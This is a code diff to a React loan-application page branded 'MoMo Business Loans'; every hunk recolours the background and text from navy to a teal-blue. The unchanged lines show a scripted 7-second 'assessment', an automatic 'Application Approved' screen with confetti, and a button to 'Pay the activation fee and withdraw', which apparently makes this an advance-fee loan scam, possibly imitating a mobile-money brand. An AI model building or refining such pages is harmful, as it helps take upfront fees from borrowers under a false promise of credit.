@@ -244,9 +244,9 @@ export default function LoanApplication() {
   if (flowState === 'questionnaire') {
     return (
       <PageLoader>
-        <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
+        <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
           {/* Header */}
-          <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -254,14 +254,14 @@ export default function LoanApplication() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
                 Step 1: Eligibility Check
               </span>
             </div>
           </header>
 
           <main className="flex-1 container mx-auto max-w-lg px-4 py-8">
-            <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
+            <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
               <button
                 onClick={() => navigate('/')}
                 className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold mb-4 transition"
@@ -274,7 +274,7 @@ export default function LoanApplication() {
                 <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-2 border border-[#ffcc00]/30">
                   <Briefcase className="w-6 h-6 text-gray-900" />
                 </div>
-                <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(220,50%,12%)]">
+                <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(198,100%,22%)]">
                   Income & Eligibility Check
                 </h2>
                 <p className="text-gray-500 text-xs sm:text-sm mt-1">
@@ -437,7 +437,7 @@ export default function LoanApplication() {
                   id="questionnaire-continue-btn"
                   onClick={() => isEligible && setFlowState('form')}
                   disabled={!isEligible}
-                  className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-black text-base hover:bg-[#ffcc00]/90 disabled:opacity-30 disabled:cursor-not-allowed transition shadow-md flex items-center justify-center gap-2 cursor-pointer mt-4"
+                  className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 disabled:opacity-30 disabled:cursor-not-allowed transition shadow-md flex items-center justify-center gap-2 cursor-pointer mt-4"
                 >
                   {isBlocked ? (
                     <span>Cannot Proceed (Income Required)</span>
@@ -464,7 +464,7 @@ export default function LoanApplication() {
   // State 1: Loading Page while assessing approval (7 seconds)
   if (flowState === 'loading') {
     return (
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
           MoMo <span className="text-[#ffcc00]">Business Loans</span>
@@ -484,7 +484,7 @@ export default function LoanApplication() {
           </div>
 
           {/* 7-second Progress Bar */}
-          <div className="w-full bg-[hsl(220,50%,18%)] rounded-full h-3 border border-[hsl(220,30%,28%)] overflow-hidden p-0.5">
+          <div className="w-full bg-[hsl(198,80%,28%)] rounded-full h-3 border border-[hsl(198,55%,35%)] overflow-hidden p-0.5">
             <div
               className="bg-[#ffcc00] h-full rounded-full transition-all duration-150 ease-out"
               style={{ width: `${Math.min(loadingProgress, 100)}%` }}
@@ -503,11 +503,11 @@ export default function LoanApplication() {
   if (flowState === 'congratulations') {
     return (
       <PageLoader>
-        <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col relative overflow-x-hidden">
+        <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col relative overflow-x-hidden">
           <Confetti />
 
           {/* Header */}
-          <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -515,7 +515,7 @@ export default function LoanApplication() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
                 Application Approved
               </span>
             </div>
@@ -523,12 +523,12 @@ export default function LoanApplication() {
 
           {/* Main Congratulations Card */}
           <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
-            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-lg w-full shadow-2xl text-[hsl(220,50%,12%)] border border-gray-100 relative z-10">
+            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-lg w-full shadow-2xl text-[hsl(198,100%,22%)] border border-gray-100 relative z-10">
               <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-green-200">
                 <CheckCircle2 className="w-12 h-12 text-green-500" />
               </div>
 
-              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(220,50%,12%)]">
+              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(198,100%,22%)]">
                 🎉 Congratulations, {firstName}!
               </h2>
 
@@ -590,7 +590,7 @@ export default function LoanApplication() {
                     },
                   })
                 }
-                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer group"
+                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer group"
               >
                 <span>Pay the activation fee and withdraw</span>
                 <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
@@ -610,9 +610,9 @@ export default function LoanApplication() {
   // State 3: Loan Application Form with boxes 2 in each row/line
   return (
     <PageLoader>
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Header */}
-        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -620,7 +620,7 @@ export default function LoanApplication() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
               Step 2: Loan Details
             </span>
           </div>
@@ -628,7 +628,7 @@ export default function LoanApplication() {
 
         {/* Content */}
         <main className="flex-1 container mx-auto max-w-2xl px-3 sm:px-4 py-6 sm:py-8">
-          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
+          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
             <div className="flex items-center justify-between mb-4">
               <button
                 id="loan-app-back-btn"
@@ -647,7 +647,7 @@ export default function LoanApplication() {
               <div className="w-11 h-11 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-2 border border-[#ffcc00]/30">
                 <Building2 className="w-5 h-5 text-gray-800" />
               </div>
-              <h2 className="text-xl sm:text-2xl font-extrabold tracking-tight text-[hsl(220,50%,12%)]">
+              <h2 className="text-xl sm:text-2xl font-extrabold tracking-tight text-[hsl(198,100%,22%)]">
                 Instant MoMo Business Loan Application
               </h2>
               <p className="text-gray-500 text-xs sm:text-sm mt-0.5">
@@ -878,7 +878,7 @@ export default function LoanApplication() {
                   id="submit-loan-app-btn"
                   type="submit"
                   disabled={!numericAmount}
-                  className="w-full py-3.5 sm:py-4 rounded-xl sm:rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer"
+                  className="w-full py-3.5 sm:py-4 rounded-xl sm:rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-sm sm:text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2 cursor-pointer"
                 >
                   <span>Submit Application ({formattedAmountDisplay})</span>
                   <ArrowRight className="w-4 h-4" />
